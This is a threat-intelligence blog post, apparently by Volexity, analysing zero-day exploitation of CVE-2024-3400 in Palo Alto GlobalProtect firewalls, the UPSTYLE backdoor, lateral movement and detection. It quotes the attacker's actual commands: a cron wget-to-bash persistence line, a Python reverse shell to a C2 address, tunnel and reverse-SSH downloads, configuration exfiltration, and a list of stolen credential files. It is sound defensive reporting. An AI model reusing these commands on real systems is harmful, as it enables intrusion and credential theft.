				<p style="font-weight: 400;"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-3180" src="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png" alt="Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400" width="2060" height="1076" srcset="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400.png 2060w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-300x157.png 300w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-1024x535.png 1024w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-768x401.png 768w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-1536x802.png 1536w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400-2048x1070.png 2048w" sizes="(max-width: 2060px) 100vw, 2060px" /></p>
<blockquote>
<p style="font-weight: 400;"><em>Volexity would like to thank Palo Alto Networks for their partnership, cooperation, and rapid response to this critical issue.</em> <em>Their research can be found </em><a href="http://unit42.paloaltonetworks.com/cve-2024-3400"><em>here</em></a>.</p>
</blockquote>
<p style="font-weight: 400;">On April 10, 2024, Volexity identified zero-day exploitation of a vulnerability found within the GlobalProtect feature of Palo Alto Networks PAN-OS at one of its network security monitoring (NSM) customers. Volexity received alerts regarding suspect network traffic emanating from the customer’s firewall. A subsequent investigation determined the device had been compromised. The following day, April 11, 2024, Volexity observed further, identical exploitation at another one of its NSM customers by the same threat actor.</p>
<p style="font-weight: 400;">The threat actor, which Volexity tracks under the alias UTA0218, was able to remotely exploit the firewall device, create a reverse shell, and download further tools onto the device. The attacker focused on exporting configuration data from the devices, and then leveraging it as an entry point to move laterally within the victim organizations.</p>
<p style="font-weight: 400;">Volexity worked closely with its customer and the Palo Alto Networks Product Security Incident Response Team (PSIRT) to investigate the root cause of the compromise. Through this cooperative investigation, the Palo Alto Networks PSIRT team was able to confirm the vulnerability as an OS command injection issue and assigned it CVE-2024-3400. The issue is an unauthenticated remote code execution vulnerability with a CVSS base score of 10.0. Palo Alto Networks has since <a href="https://security.paloaltonetworks.com/CVE-2024-3400">issued an advisory</a> for CVE-2024-3400 that includes information regarding a threat protection signature released to customers, as well as a timeline for a fix, which at the time of writing is expected April 14, 2024.</p>
<p style="font-weight: 400;">During its investigation, Volexity observed that UTA0218 attempted to install a custom Python backdoor, which Volexity calls UPSTYLE, on the firewall. The UPSTYLE backdoor allows the attacker to execute additional commands on the device via specially crafted network requests. Details on this backdoor are included further on in this report.</p>
<p style="font-weight: 400;">As Volexity broadened its investigation, it discovered successful exploitation at multiple other customers and organizations dating back to March 26, 2024. Those attempts appear to be the threat actor testing the vulnerability by placing zero-byte files on firewall devices to validate exploitability. On April 7, 2024, Volexity observed the attacker attempting and failing to deploy a backdoor on a customer’s firewall device. Three days later, on April 10, 2024, UTA0218 was observed exploiting firewall devices to successfully deploy malicious payloads. A second compromise Volexity observed on April 11, 2024, followed a nearly identical playbook. <span class="ui-provider a b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak" dir="ltr">A timeline associated with the discovery and subsequent activities is below.</span></p>
<p><img decoding="async" class="aligncenter size-full wp-image-3197" src="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2.png" alt="" width="1200" height="1048" srcset="https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2.png 1200w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2-300x262.png 300w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2-1024x894.png 1024w, https://www.volexity.com/wp-content/uploads/2024/04/Volexity-Blog-CVE-20214-3400-timeline-2-768x671.png 768w" sizes="(max-width: 1200px) 100vw, 1200px" /></p>
<p style="font-weight: 400;">After successfully exploiting devices, UTA0218 downloaded additional tooling from remote servers they controlled in order to facilitate access to victims’ internal networks. They quickly moved laterally through victims’ networks, extracting sensitive credentials and other files that would enable access during and potentially after the intrusion. The tradecraft and speed employed by the attacker suggests a highly capable threat actor with a clear playbook of what to access to further their objectives. Volexity is not currently able to provide an estimate as to the scale of exploitation taking place. It is likely the firewall device exploitation, followed by hands-on-keyboard activity, was limited and targeted. However, as noted previously, evidence of potential reconnaissance activity involving more widespread exploitation aimed at identifying vulnerable systems does appear to have occurred at the time of writing.</p>
<p style="font-weight: 400;">Volexity strongly recommends organizations using Palo Alto Networks GlobalProtect firewall devices read <a href="https://security.paloaltonetworks.com/CVE-2024-3400">the advisory</a> to ensure their firewall devices have the correct protections in place, or otherwise take mitigation actions to ensure they are no longer vulnerable. As always, it should be noted that these mitigations and fixes will not remediate an existing compromise. Affected organizations should rapidly investigate their systems and networks for potential breaches.</p>
<p style="font-weight: 400;">This blog post describes the malware the attacker added to compromised devices, observed attempts at lateral movement, and methods organizations can use to identify potential compromise of their networks.</p>
<h2>Analysis</h2>
<h3>Investigation Summary</h3>
<p style="font-weight: 400;">Volexity used telemetry from its own network security sensors, client endpoint detection, response (EDR) software, and forensic data collected from multiple systems to paint a thorough picture of the attacker’s actions in the incidents investigated.</p>
<p style="font-weight: 400;">Below are the highlights of Volexity’s observations from the course of the performed investigations:</p>
<ul>
<li>Zero-day exploitation of a vulnerability in Palo Alto Global Protect firewall devices that allowed for unauthenticated remote code execution to take place. Initial exploitation was used to create a reverse shell, download tools, exfiltrate configuration data, and move laterally within the network.</li>
<li>The threat actor has developed and attempted to deploy a novel python-based backdoor that Volexity calls UPSTYLE.</li>
<li>The earliest evidence of attempted exploitation observed by Volexity thus far is on March 26, 2024 when attackers appeared to verify that exploitation worked correctly.</li>
<li>The initial persistence mechanism setup by UTA0218 involved configuring a cron job that would use <code>wget</code> to retrieve a payload from an attacker-controlled URL with its output being written to <code>stdout</code> and piped to bash for execution. The attacker used this method to deploy and execute specific commands and download reverse proxy tooling such as GOST (GO Simple Tunnel).</li>
<li>In one case a service account configured for use by the Palo Alto firewall, and a member of the domain admins group, was used by the attackers to pivot internally across the affected networks via SMB and WinRM.</li>
<li>UTA0218’s initial objectives were aimed at grabbing the domain backup DPAPI keys and targeting active directory credentials by obtaining the NTDS.DIT file. They further targeted user workstations to steal saved cookies and login data, along with the users’ DPAPI keys.</li>
</ul>
<p style="font-weight: 400;"><strong> </strong>A detailed description of the items summarized above can be found in the following sections.</p>
<h3>UPSTYLE Backdoor</h3>
<p style="font-weight: 400;">In two cases UTA0218 was observed attempting to download and execute a backdoor Volexity calls UPSTYLE. There were two slight variations of this tool observed with only minor differences between the files. In one case the filename used by UTA0218 was <code>update.py</code>. UTA0218 attempted to download and execute this file via the CVE-2024-3400 but was unsuccessful. However, Volexity was still able to recover the file for analysis.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="312">update.py</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="312">5.1KB (5187 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="312">text/plain</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="312">0c1554888ce9ed0da1583dbdf7b31651</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="312">988fc0d23e6e30c2c46ccec9bbff50b7453b8ba9</td>
</tr>
<tr>
<td width="312"><strong>SHA256</strong></td>
<td width="312">3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac</td>
</tr>
<tr>
<td width="312"><strong>VirusTotal First Submitted</strong></td>
<td width="312">N/A</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">The purpose of the update.py script is to deploy a backdoor to the following path: <code>/usr/lib/python3.6/site-packages/system.pth</code>. The backdoor, written in Python, starts by an <code>import</code> and its main content is stored as a base64 encoded blob. The <code>.pth</code> extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in <code>.pth</code> files beginning with the text “<code>import</code>” followed by a space or a tab, are executed as described in the <a href="https://docs.python.org/3/library/site.html">official documentation</a>. Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.</p>
<p style="font-weight: 400;">The commands to be executed are forged by the attacker by requesting a non-existent web page which contains the specific pattern. The backdoor’s purpose is to then parse the web server error log (<code>/var/log/pan/sslvpn_ngx_error.log</code>) looking for the pattern, and to parse and decode data added to the non-existent URI, executing the command contained within. The command output is then appended to a CSS file which is a legitimate part of the firewall (<code>/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css</code>).</p>
<p style="font-weight: 400;">After the command’s execution is complete and the output has been written, the log entry that was originally read and contained the command is removed from the <code>sslvpn_ngx_error.log</code> file. Fifteen seconds after execution, the original version of <code>bootstrap.min.css</code> is also restored to its previous state. The access and modified timestamps are also restored for both files. Figure 1 shows UPSTYLE main loop.</p>
<p><img decoding="async" class="aligncenter size-full wp-image-3178" src="https://www.volexity.com/wp-content/uploads/2024/04/image001.png" alt="" width="798" height="615" srcset="https://www.volexity.com/wp-content/uploads/2024/04/image001.png 798w, https://www.volexity.com/wp-content/uploads/2024/04/image001-300x231.png 300w, https://www.volexity.com/wp-content/uploads/2024/04/image001-768x592.png 768w" sizes="(max-width: 798px) 100vw, 798px" /></p>
<p style="font-weight: 400; text-align: center;"><em>Figure 1. UPSTYLE main loop</em></p>
<p style="font-weight: 400;">The overall workflow of the malware is described in Figure 2.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3179" src="https://www.volexity.com/wp-content/uploads/2024/04/image002.png" alt="" width="1515" height="786" srcset="https://www.volexity.com/wp-content/uploads/2024/04/image002.png 1515w, https://www.volexity.com/wp-content/uploads/2024/04/image002-300x156.png 300w, https://www.volexity.com/wp-content/uploads/2024/04/image002-1024x531.png 1024w, https://www.volexity.com/wp-content/uploads/2024/04/image002-768x398.png 768w" sizes="auto, (max-width: 1515px) 100vw, 1515px" /></p>
<p style="font-weight: 400; text-align: center;"><em>Figure 2. UPSTYLE workflow</em></p>
<h3>Post-exploitation Activity</h3>
<p style="font-weight: 400;">For the purpose of this blog post, the following filenames and indicators are related to the exploitation that occurred on April 10, 2024. However, the reader should note that in subsequent exploitation, these files were altered by UTA0218 for different victims. Their purpose and operation, however, were fundamentally the same.</p>
<p style="font-weight: 400;">After exploitation, the threat actor established persistence by continuously fetching and executing the contents of a file named <code>patch</code>. When executed, this file downloads and executes a remotely hosted file named <code>policy</code>. By modifying the contents of the <code>policy</code> file, the threat actor was able to execute a variety of commands on the compromised device. A total of six different permutations of the <code>policy</code> file were observed by Volexity.</p>
<p style="font-weight: 400;">The details of the <code>patch</code> file are shown below:</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="312"><strong>Name(s)</strong></td>
<td width="312">patch</td>
</tr>
<tr>
<td width="312"><strong>Size</strong></td>
<td width="312">160.0B (160 Bytes)</td>
</tr>
<tr>
<td width="312"><strong>File Type</strong></td>
<td width="312">text/plain</td>
</tr>
<tr>
<td width="312"><strong>MD5</strong></td>
<td width="312">d31ec83a5a79451a46e980ebffb6e0e8</td>
</tr>
<tr>
<td width="312"><strong>SHA1</strong></td>
<td width="312">a7c6f264b00d13808ceb76b3277ee5461ae1354e</td>
</tr>
<tr>
<td width="312"><strong>SHA256</strong></td>
<td width="312">35a5f8ac03b0e3865b3177892420cb34233c55240f452f00f9004e274a85703c</td>
</tr>
<tr>
<td width="312"><strong>VirusTotal First Submitted</strong></td>
<td width="312">N/A</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;">The contents of the patch file are shown below:</p>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code><span class="codeinparagraph">if [ ! -f '/etc/cron.d/update' ]; then<br />
</span>    printf "SHELL=/bin/bash\n\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\n\n" &gt; /etc/cron.d/update</code><br />
<code><span style="font-size: 1.6rem;">fi</span></code></p></blockquote>
</div>
<p style="font-weight: 400;">When executed, it checks for the existence of a cron file named <code>update</code>. If this cron file does not exist, it creates the file and uses it to establish a cron job. It also downloads a remotely hosted file named <code>policy</code> and executes it via bash every 60 seconds. The attacker then manually updates the contents of the remote file over time to retrieve data from the device and create a reverse shell.</p>
<p style="font-weight: 400;">Interestingly, the attacker appeared to manually manage an access control list for this command-and-control (C2) server, as it could not be accessed on the same port from any location other than the device communicating with it.</p>
<h4><strong>Malicious Code Executed via Policy File</strong></h4>
<p style="font-weight: 400;">Six different versions of the <code>policy</code> file were observed by Volexity. They each represent a different set of actions taken by the threat actor on a compromised device. The numbered versions that follow are the order in which they were used by the threat actor.</p>
<p style="font-weight: 400;"><strong>Version 1</strong></p>
<p style="font-weight: 400;">This file contained a one-liner reverse shell written in Python.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="468">policy</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="468">287B (287 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="468">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="468">a43e3cf908244f85b237fdbacd8d82d5</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="468">e1e427c9b46064e2b483f90b13490e6ef522cc06</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="468">755f5b8bd67d226f24329dc960f59e11cb5735b930b4ed30b2df77572efb32e8</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="468">N/A</td>
</tr>
</tbody>
</table>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash</code><br />
<code><span style="font-size: 1.6rem;">r=`ps -ef | grep "import sys,socket,os" | grep -v grep`<br />
</span><span style="font-size: 1.6rem;">if [[ -z "$r" ]]; then<br />
</span><span style="font-size: 1.6rem;">    python -c "import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')"<br />
</span><span style="font-size: 1.6rem;">fi</span></code></p></blockquote>
</div>
<p style="font-weight: 400;"><strong>Version 2</strong></p>
<p style="font-weight: 400;">The attacker removed any previously created CSS files containing various attacker command output, and then copied the configuration data from the firewall device into a new file, storing the hostname of the device in the CSS file. These files were saved to an externally accessible web directory where the attacker could subsequently retrieve them.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="470">policy</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="470">216B (216 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="470">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="470">5e4c623296125592256630deabdbf1d2</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="470">d12b614e9417c4916d5c5bb6ee42c487c937c058</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="470">adba167a9df482aa991faaa0e0cde1182fb9acfbb0dc8d19148ce634608bab87</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="470">N/A</td>
</tr>
</tbody>
</table>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash</code><br />
<code><span style="font-size: 1.6rem;">rm -f /var/appweb/sslvpndocs/global-protect/*.css<br />
</span><span style="font-size: 1.6rem;">cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css<br />
</span><span style="font-size: 1.6rem;">uname -a &gt; /var/appweb/sslvpndocs/global-protect/&lt;redacted&gt;.css</span></code></p></blockquote>
</div>
<p style="font-weight: 400;"><strong>Version 3</strong></p>
<p style="font-weight: 400;">This file was used to remove CSS files created in the previous step.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="475">policy</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="475">62B (62 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="475">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="475">87312a7173889a8a5258c68cac4817bd</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="475">3ad9be0c52510cbc5d1e184e0066d14c1f394d4d</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="475">c1a0d380bf55070496b9420b970dfc5c2c4ad0a598083b9077493e8b8035f1e9</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="475">N/A</td>
</tr>
</tbody>
</table>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash</code><br />
<code><span style="font-size: 1.6rem;">rm -f /var/appweb/sslvpndocs/global-protect/*.css</span></code></p>
</blockquote>
</div>
<p style="font-weight: 400;"><strong>Version 4</strong></p>
<p style="font-weight: 400;">This version attempts to download a Golang tunneling tool named <a href="https://github.com/ginuerzh/gost">GOST</a> and execute it with two different command-line options to establish SOCKS5 and RTCP tunnels. However, the threat actor appears to have failed to successfully download the tool on this attempt.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="475">policy</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="475">388B (388 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="475">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="475">b9f5e9db9eec8d1301026c443363cf6b</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="475">d7a8d8303361ffd124cb64023095da08a262cab4</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="475">fe07ca449e99827265ca95f9f56ec6543a4c5b712ed50038a9a153199e95a0b7</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="475">N/A</td>
</tr>
</tbody>
</table>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash</code><br />
<code><span style="font-size: 1.6rem;">wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz<br />
</span><span style="font-size: 1.6rem;">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css<br />
</span><span style="font-size: 1.6rem;">gzip -d /tmp/vpn_prot.gz<br />
</span><span style="font-size: 1.6rem;">chmod +x /tmp/vpn_prot<br />
</span><span style="font-size: 1.6rem;">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;<br />
</span><span style="font-size: 1.6rem;">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span></code></p></blockquote>
</div>
<p style="font-weight: 400;"><strong>Version 5</strong></p>
<p style="font-weight: 400;">This is a modified version of Version 4 that successfully downloads GOST in a base64-encoded format.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="469">policy</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="469">421B (421 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="469">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="469">12b5e30c2276664e87623791085a3221</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="469">f99779a5c891553ac4d4cabf928b2121ca3d1a89</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="469">96dbec24ac64e7dd5fef6e2c26214c8fe5be3486d5c92d21d5dcb4f6c4e365b9</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="469">N/A</td>
</tr>
</tbody>
</table>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash</code><br />
<code><span style="font-size: 1.6rem;">wget http://172.233.228[.]93/vpn.log -O /tmp/vpn.log<br />
</span><span style="font-size: 1.6rem;">base64 -d /tmp/vpn.log &gt; /tmp/vpn_prot.gz<br />
</span><span style="font-size: 1.6rem;">ls -l /tmp/vpn_prot.gz &gt; /var/appweb/sslvpndocs/global-protect/u.css<br />
</span><span style="font-size: 1.6rem;">gzip -d /tmp/vpn_prot.gz<br />
</span><span style="font-size: 1.6rem;">chmod +x /tmp/vpn_prot<br />
</span><span style="font-size: 1.6rem;">nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 &gt; /dev/null 2&gt;&amp;1 &amp;<br />
</span><span style="font-size: 1.6rem;">nohup /tmp/vpn_prot -L rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 &gt; /dev/null 2&gt;&amp;1 &amp;</span></code></p></blockquote>
</div>
<p style="font-weight: 400;">The details of the GOST sample are as follows:</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="476">gost-linux-amd64</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="476">12.9MB (13578240 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="476">ELF</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="476">089801d87998fa193377b9bfe98e87ff</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="476">4ad043c8f37a916761b4c815bed23f036dfb7f77</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="476">448fbd7b3389fe2aa421de224d065cea7064de0869a036610e5363c931df5b7c</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="476">2023-01-29 01:30:47 UTC | af632c50 (api) - Unknown US</td>
</tr>
</tbody>
</table>
<p style="font-weight: 400;"><strong>Version 6</strong></p>
<p style="font-weight: 400;">This file contains commands to download and execute an <a href="https://github.com/Fahrj/reverse-ssh">open-source</a> reverse shell that operates over SSH. The threat actor configures this shell to run on port 31289.</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="468">policy(6)</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="468">189.0B (189 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="468">text/x-shellscript</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="468">724c8059c150b0f3d1e0f80370bcfe19</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="468">5592434c40a30ed2dfdba0a86832b5f2eaaa437c</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="468">e315907415eb8cfcf3b6a4cd6602b392a3fe8ee0f79a2d51a81a928dbce950f8</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="468">N/A</td>
</tr>
</tbody>
</table>
<div>
<div>
<blockquote>
<p class="codeblockCxSpFirst"><code>#!/bin/bash<br />
</code><code style="font-size: 1.6rem;">wget http://172.233.228[.]93/lowdp -O /tmp/lowdp<br />
</code><code style="font-size: 1.6rem;">ls -l /tmp/lowdp &gt; /var/appweb/sslvpndocs/global-protect/u.css<br />
</code><code style="font-size: 1.6rem;">chmod +x /tmp/lowdp<br />
</code><code style="font-size: 1.6rem;">nohup /tmp/lowdp -l -p 31289 &gt; /dev/null 2&gt;&amp;1 &amp;</code></p></blockquote>
</div>
</div>
<p style="font-weight: 400;">Details of the binary are shown below:</p>
<table style="font-weight: 400;">
<tbody>
<tr>
<td width="185"><strong>Name(s)</strong></td>
<td width="467">reverse-sshx64</td>
</tr>
<tr>
<td width="185"><strong>Size</strong></td>
<td width="467">3.5MB (3690496 Bytes)</td>
</tr>
<tr>
<td width="185"><strong>File Type</strong></td>
<td width="467">ELF</td>
</tr>
<tr>
<td width="185"><strong>MD5</strong></td>
<td width="467">427258462c745481c1ae47327182acd3</td>
</tr>
<tr>
<td width="185"><strong>SHA1</strong></td>
<td width="467">ef8036eb4097789577eff62f6c9580fa130e7d56</td>
</tr>
<tr>
<td width="185"><strong>SHA256</strong></td>
<td width="467">161fd76c83e557269bee39a57baa2ccbbac679f59d9adff1e1b73b0f4bb277a6</td>
</tr>
<tr>
<td width="185"><strong>VirusTotal First Submitted</strong></td>
<td width="467">2022-08-08 18:30:19 UTC | 1c0b809a (web) - Unknown NL</td>
</tr>
</tbody>
</table>
<h3>Lateral Movement &amp; Data theft</h3>
<p style="font-weight: 400;">In one instance of successful compromise, a highly privileged service account used by the Palo Alto Networks firewall device was used by the attacker to pivot into the internal network via SMB and WinRM. The targeted data included the Active Directory database (<code>ntds.dit</code>), key data (DPAPI) and Windows event logs (<code>Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</code>).</p>
<p style="font-weight: 400;">In addition to Windows-related data, the attacker also stole <code>Login Data</code>, <code>Cookies</code>, and <code>Local State</code> data for Chrome and Microsoft Edge from specific targets. With this data, the attacker was able to grab the browser master key and decrypt sensitive data, such as stored credentials.</p>
<p style="font-weight: 400;">The list of files grabbed by the attacker is below:</p>
<p><code>%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data<br />
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network<br />
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies<br />
%LOCALAPPDATA%\Google\Chrome\User Data\Local State<br />
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data<br />
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network<br />
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies<br />
%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State<br />
%APPDATA%\Roaming\Microsoft\Protect\&lt;SID&gt; -&gt; DPAPI Keys<br />
%SystemRoot%\NTDS\ntds.dit<br />
%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</code></p>
<p>UTA0218 was not observed deploying malware or additional methods of persistence on systems within victim networks. This may be due in part to the rapid detection and response by Volexity and its customers. The stolen data did allow the attacker to effectively compromise credentials for all domain accounts. Further, the attacker gained access and could potentially use valid credentials or cookies taken from browser data for specific user workstations accessed.</p>
<h3>Infrastructure</h3>
<p style="font-weight: 400;">Volexity observed UTA0218 leveraging a mix of infrastructure during their operations, which can be broadly broken into two categories:</p>
<ul>
<li>C2 infrastructure hosting malware, used for communication channels</li>
<li>Anonymized source infrastructure, used to access tooling and interact with victim infrastructure</li>
</ul>
<p style="font-weight: 400;">The anonymized infrastructure appears to have included a mix of VPN usage, as well as potentially compromised ASUS routers. The infrastructure was used to access files created by the attacker. Additionally, UTA0218 abused a compromised AWS bucket and various Virtual Private Servers (VPS) providers to store malicious files. The infrastructure observed by Volexity does not have any overlaps with other threat actors in Volexity’s aperture at this time.</p>
<h2>Detecting Compromise</h2>
<p style="font-weight: 400;">There are two primary methods for identifying compromise on an impacted firewall device. The first method involves monitoring network traffic and activity emanating from Palo Alto Networks firewall devices. Volexity is still working to coordinate with Palo Alto Networks regarding the second method and thus is not describing it at this time. Volexity will update this blog post when more details can be made available.</p>
<p style="font-weight: 400;">The section that follows describes what organizations can do to look for signs of compromise. Any of these methods can provide strong evidence that the Palo Alto Networks GlobalProtect firewall device is compromised. Should signs of compromise be identified, refer to <a href="#RespondingToCompromise">Responding to Compromise</a> for what to do next.</p>
<h3>Network Traffic Analysis</h3>
<p style="font-weight: 400;">Volexity initially identified activity that led to the discovery of the Palo Alto Networks GlobalProtect firewall device exploitation via an alert for malicious network requests generated by Volexity's NSM sensors. Review of network traffic logs for outbound connections originating from the GlobalProtect firewall device, as well as destined for the device, can help identify anomalous activity. Example activity that Volexity observed from compromised GlobalProtect devices includes the following:</p>
<ul>
<li>Direct-to-IP HTTP requests to download files noted in the previous section via <code>wget</code><br />
While it would not be uncommon to observe <code>wget</code> requests for files in a larger environment, this type of request originating from the firewall device is not something Volexity has observed outside of the attacker activity.</li>
<li>SMB / RDP connections to multiple systems across the environment, originating from the GlobalProtect appliance</li>
<li>SMB file transfers of Google Chrome or Microsoft Edge browser data or the <code>ntds.dit</code> file</li>
<li>HTTP request for the URL <code>worldtimeapi[.]org/api/timezone/etc/utc</code> originating from the Global Protect appliance<br />
While this hostname is legitimate, in both occurrences of compromise an HTTP GET request to this URL was observed. This does not appear to be a commonly occurring network request.</li>
</ul>
<p style="font-weight: 400;">Volexity also leveraged its customer’s Endpoint Detection and Response (EDR) software to investigate alerts that triggered for data exfiltration over SMB. Having both network visibility and EDR telemetry allowed Volexity to fully map out all systems the attacker accessed via the compromised GlobalProtect firewall device.</p>
